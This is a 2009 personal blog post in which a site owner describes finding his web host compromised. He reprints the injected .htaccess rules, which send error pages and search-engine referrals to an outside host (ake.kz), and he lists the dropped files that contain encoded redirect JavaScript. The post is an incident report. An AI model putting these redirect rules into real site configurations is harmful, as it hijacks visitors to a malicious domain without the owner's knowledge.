---
id: 273
title: Latest activity
date: 2009-07-26T10:43:50
slug: latest-activity
type: post
path: /2009/07/26/latest-activity/
link: "https://jiehong.org/2009/07/26/latest-activity/"
---

# Latest activity

It’s been a while since my last entry. A few things was happening, my blog engine went kaput a few weeks ago and it actually affected my Google ranking. 🙁 I saw a significant drop search engine directed traffic.

Recently I discovered some malicious activity on my other web host. I was going through my gallery, http://jiehong.net/gallery when after a few clicks, I got re-directed to ask.com. I thought I haven’t renew my subscription or my domain hosting. 

After checking my subscriptions, all is fine. I went into cPanel to poke around. What can cause re-directions, I check the re-directions settings, sub-domains etc. Finally I discover some re-directing codes in some of my .htaccess.

Sample:

> 

ErrorDocument 400 http://ake.kz/in.cgi?8

ErrorDocument 401 http://ake.kz/in.cgi?8

ErrorDocument 403 http://ake.kz/in.cgi?8

ErrorDocument 404 http://ake.kz/in.cgi?8

ErrorDocument 500 http://ake.kz/in.cgi?8

RewriteEngine On

RewriteCond %{HTTP_REFERER} .*google.* [OR]

RewriteCond %{HTTP_REFERER} .*ask.* [OR]

RewriteCond %{HTTP_REFERER} .*yahoo.* [OR]

RewriteCond %{HTTP_REFERER} .*excite.* [OR]

RewriteCond %{HTTP_REFERER} .*altavista.* [OR]

RewriteCond %{HTTP_REFERER} .*msn.* [OR]

RewriteCond %{HTTP_REFERER} .*netscape.* [OR]

RewriteCond %{HTTP_REFERER} .*aol.* [OR]

RewriteCond %{HTTP_REFERER} .*hotbot.* [OR]

RewriteCond %{HTTP_REFERER} .*goto.* [OR]

RewriteCond %{HTTP_REFERER} .*infoseek.* [OR]

RewriteCond %{HTTP_REFERER} .*mamma.* [OR]

RewriteCond %{HTTP_REFERER} .*alltheweb.* [OR]

RewriteCond %{HTTP_REFERER} .*lycos.* [OR]

RewriteCond %{HTTP_REFERER} .*search.* [OR]

RewriteCond %{HTTP_REFERER} .*metacrawler.* [OR]

RewriteCond %{HTTP_REFERER} .*bing.* [OR]

RewriteCond %{HTTP_REFERER} .*dogpile.*

RewriteRule ^(.*)$ http://ake.kz/in.cgi?7 [R=301,L]

I discovered a folder was created in my public_html, “coming10/almost”. What’s almost, the hacking is almost done ?

I found the following files inside

 – .htaccess

 – doing83.html

 – er404.php

 – everyting40php

 – thanks28.html

They all contain encoded javascript to redirect visitors to some site. MY VISITORS ! I reported to my web host, I wonder how much action can they take. They are using ClamAV to scan the /home. Oh well… I’m expecting somebody eye-balling the logs to determine the source of entry.

Now I still do not know how they got in, so I need to monitor my site very closely.
